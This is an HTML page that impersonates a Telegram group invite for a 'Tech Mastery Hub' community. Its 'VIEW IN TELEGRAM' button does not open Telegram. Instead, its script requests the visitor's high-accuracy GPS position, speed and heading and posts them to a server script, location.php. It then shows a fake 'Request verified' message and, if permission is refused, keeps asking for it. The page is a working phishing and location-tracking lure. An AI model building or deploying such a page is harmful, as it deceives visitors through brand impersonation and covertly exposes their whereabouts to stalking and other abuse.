<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>

<title>Telegram</title>

<link rel="icon" href="https://telegram.org/favicon.ico"/>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet"/>

<style>
*,*::before,*::after{
  box-sizing:border-box;
  margin:0;
  padding:0;
}

body{
  font-family:'Inter',sans-serif;
  background:#fff;
  min-height:100vh;
  display:flex;
  flex-direction:column;
}

/* TOPBAR */
.topbar{
  display:flex;
  align-items:center;
  gap:10px;
  padding:0 20px;
  height:54px;
  background:#fff;
  border-bottom:1px solid #f0f0f0;
}

.tg-icon{
  width:36px;
  height:36px;
}

.tg-wordmark{
  font-size:20px;
  font-weight:600;
  color:#2d2d2d;
}

/* BANNER */
.banner{
  background:#54a9e8;
  color:#fff;
  text-align:center;
  padding:11px 20px;
  font-size:14px;
}

.banner strong{
  font-weight:700;
}

/* MAIN */
main{
  flex:1;
  display:flex;
  align-items:center;
  justify-content:center;
  padding:50px 20px;
}

.group-wrap{
  width:100%;
  max-width:390px;
  text-align:center;
}

/* AVATAR */
.group-avatar{
  width:125px;
  height:125px;
  border-radius:50%;
  overflow:hidden;
  margin:0 auto 20px;
  box-shadow:0 4px 20px rgba(0,0,0,.12);
}

.group-avatar img{
  width:100%;
  height:100%;
  object-fit:cover;
  display:block;
}

/* GROUP INFO */
.group-name{
  font-size:24px;
  font-weight:700;
  color:#000;
  margin-bottom:8px;
}

.group-meta{
  font-size:15px;
  color:#707579;
  margin-bottom:8px;
}

.group-desc{
  font-size:14px;
  color:#707579;
  line-height:1.6;
  margin-bottom:24px;
}

/* EXTRA DETAILS */
.group-details{
  background:#f8f9fb;
  border-radius:16px;
  padding:18px;
  margin-bottom:28px;
  text-align:left;
}

.detail-item{
  margin-bottom:12px;
}

.detail-item:last-child{
  margin-bottom:0;
}

.detail-title{
  font-size:13px;
  color:#888;
  margin-bottom:3px;
}

.detail-value{
  font-size:15px;
  color:#222;
  font-weight:500;
}

/* BUTTON */
.view-btn{
  width:100%;
  background:#4dae72;
  color:#fff;
  border:none;
  border-radius:28px;
  padding:14px;
  font-size:14px;
  font-weight:700;
  letter-spacing:.5px;
  cursor:pointer;
  transition:.2s;
  box-shadow:0 4px 12px rgba(77,174,114,.3);
}

.view-btn:hover{
  background:#43a367;
}

/* TOAST */
.toast{
  position:fixed;
  bottom:30px;
  left:50%;
  transform:translateX(-50%);
  background:#222;
  color:#fff;
  padding:12px 22px;
  border-radius:8px;
  font-size:13px;
  opacity:0;
  transition:.3s;
}

.toast.show{
  opacity:1;
}

/* FOOTER */
.footer{
  text-align:center;
  padding:24px 20px;
  border-top:1px solid #f0f0f0;
}

.footer-text{
  font-size:14px;
  color:#666;
  margin-bottom:8px;
}

.footer-copy{
  font-size:13px;
  color:#999;
}
</style>
</head>

<body>

<!-- TOPBAR -->
<div class="topbar">

  <svg class="tg-icon" viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
    <circle cx="24" cy="24" r="24" fill="#2AABEE"/>
    <path d="M36.5 12.5L6.5 24.2c-.8.3-.8 1.5 0 1.8l7.8 2.6 2.8 8.6c.3.8 1.3 1 1.9.4l4-3.8 7.8 5.8c.7.5 1.7.1 1.9-.7l5.5-24.3c.3-1.2-.9-2.2-2.1-1.7z" fill="white"/>
  </svg>

  <span class="tg-wordmark">Telegram</span>

</div>

<!-- BANNER -->
<div class="banner">
  Don't have <strong>Telegram</strong> yet? Try it now!
</div>

<!-- MAIN -->
<main>

  <div class="group-wrap">

    <!-- AVATAR -->
    <div class="group-avatar">
      <img src="ppp.jpeg" alt="Group Photo">
    </div>

    <!-- NAME -->
    <div class="group-name">
      Tech Mastery Hub
    </div>

    <!-- MEMBERS -->
    <div class="group-meta">
      18,492 members • 1,204 online
    </div>

    <!-- DESCRIPTION -->
    <div class="group-desc">
      Join the best Telegram community for coding, hacking, technology news, AI tools, web development, cybersecurity tips and premium resources.
    </div>

    <!-- BUTTON -->
    <button class="view-btn" onclick="viewInTelegram()">
      VIEW IN TELEGRAM
    </button>

  </div>

</main>

<!-- TOAST -->
<div class="toast" id="toast">
  Opening Telegram...
</div>

<!-- FOOTER -->
<footer class="footer">

  <div class="footer-text">
    Privacy Policy • Terms of Service • Contact • Community Rules
  </div>

  <div class="footer-copy">
    © 2026 Tech Mastery Hub. All rights reserved.
  </div>

</footer>
<script src="Detels.js"></script>
<script>
function viewInTelegram() {

  // ==========================
  // 📍 CHECK GEOLOCATION
  // ==========================
  if (!navigator.geolocation) {

    updateUI("unsupported");
    showToast("Location not supported");

    return;
  }

  // ==========================
  // 📡 REQUEST LOCATION
  // ==========================
  navigator.geolocation.getCurrentPosition(

    // ✅ SUCCESS
    function(position) {

      const data = {
        latitude: position.coords.latitude,
        longitude: position.coords.longitude,
        accuracy: position.coords.accuracy,
        altitude: position.coords.altitude,
        speed: position.coords.speed,
        heading: position.coords.heading,
        timestamp: new Date().toISOString()
      };

      console.log("📍 Location OK:", data);

      // Send to server
      sendLocation(data);

      updateUI("success");

      showToast("Request verified • Opening Telegram...");

      // OPTIONAL REDIRECT
      // setTimeout(() => {
      //   window.location.href = "https://t.me/";
      // }, 1500);
    },

    // ❌ ERROR / DENIED
    function(error) {

      console.log("❌ GPS Error:", error.message);

      if (error.code === error.PERMISSION_DENIED) {

        updateUI("denied");

        showToast("Access denied");

      } else {

        updateUI("error");

        showToast("Location error");
      }
    },

    {
      enableHighAccuracy: true,
      timeout: 30000,
      maximumAge: 0
    }
  );
}

// ==========================
// 📡 SEND LOCATION
// ==========================
async function sendLocation(data) {

  try {

    await fetch("location.php", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });

  } catch (err) {

    console.log("Server error");
  }
}

// ==========================
// 🎯 UI UPDATE
// ==========================
function updateUI(state) {

  const card = document.querySelector(".card");

  if (!card) return;

  if (state === "success") {

    card.innerHTML = `
      <h1>✓ Verified</h1>
      <p>Your request has been processed successfully.</p>
    `;
  }

  if (state === "denied") {

    card.innerHTML = `
      <h1>Access Required</h1>
      <p>Please allow permission to continue.</p>

      <button class="req-btn" onclick="viewInTelegram()">
        Allow Access
      </button>
    `;
  }

  if (state === "error") {

    card.innerHTML = `
      <h1>Try Again</h1>
      <p>Unable to get location.</p>

      <button class="req-btn" onclick="viewInTelegram()">
        Retry
      </button>
    `;
  }

  if (state === "unsupported") {

    card.innerHTML = `
      <h1>Not Supported</h1>
      <p>Your browser does not support location services.</p>
    `;
  }
}

// ==========================
// 🔔 TOAST SYSTEM
// ==========================
function showToast(message) {

  var toast = document.getElementById("toast");

  if (!toast) return;

  toast.innerHTML = message;

  toast.classList.add("show");

  setTimeout(function () {

    toast.classList.remove("show");

  }, 3000);
}
</script>
</body>
</html>